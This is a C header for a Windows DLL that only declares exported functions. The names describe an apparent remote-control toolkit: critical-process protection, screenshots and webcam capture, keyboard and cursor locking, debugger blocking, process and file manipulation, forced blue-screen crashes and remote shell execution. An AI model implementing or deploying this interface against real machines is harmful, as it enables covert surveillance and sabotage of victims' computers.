#ifndef EXPORT_H
#define EXPORT_H

#include <stdbool.h>

#define DIR_CONTENT_PAGE_LIMIT 64

#define EXPORT    __declspec(dllexport)
#define UINT      unsigned int
#define CSTR      const char*
#define IN
#define OUT

EXPORT UINT C_InitRuntimeLib();
EXPORT UINT C_InitSetProcessCritical(IN bool critical);

EXPORT UINT C_ReSetWallpaper             (IN CSTR imagePath);
EXPORT UINT C_ReSetCursor                (IN CSTR cursorPath);
EXPORT UINT C_ReShowSafeMessage          (IN CSTR content, IN CSTR title, IN UINT icon);
EXPORT UINT C_ReTakeScreenshot           (IN CSTR outputPath);
EXPORT UINT C_ReTakeCameraFrame          (IN CSTR outputPath);
EXPORT UINT C_ReLockCursor               (IN bool lock);
EXPORT UINT C_ReLockKeyboard             (IN bool lock);
EXPORT UINT C_ReLockProcessRuntime       (IN CSTR procName, IN bool lock);
EXPORT UINT C_ReLockProcessDebugger      (IN CSTR procName, IN bool lock);
EXPORT UINT C_ReTerminateProcess         (IN CSTR procName);
EXPORT UINT C_ReCreateProcess            (IN CSTR executablePath);
EXPORT UINT C_ReWriteFile                (IN CSTR filePath, IN CSTR data);
EXPORT UINT C_ReDeleteFile               (IN CSTR filePath);
EXPORT UINT C_ReCreateDirectory          (IN CSTR dirPath);
EXPORT UINT C_ReDeleteDirectory          (IN CSTR dirPath);
EXPORT UINT C_ReInitBsod                 (IN UINT crashCode);
EXPORT UINT C_ReShellInput               (IN CSTR command, IN CSTR cwdPath, OUT CSTR output);
EXPORT UINT C_ReGetDirContent            (IN CSTR dirPath, OUT CSTR content[DIR_CONTENT_PAGE_LIMIT], UINT pageNumber);

#endif
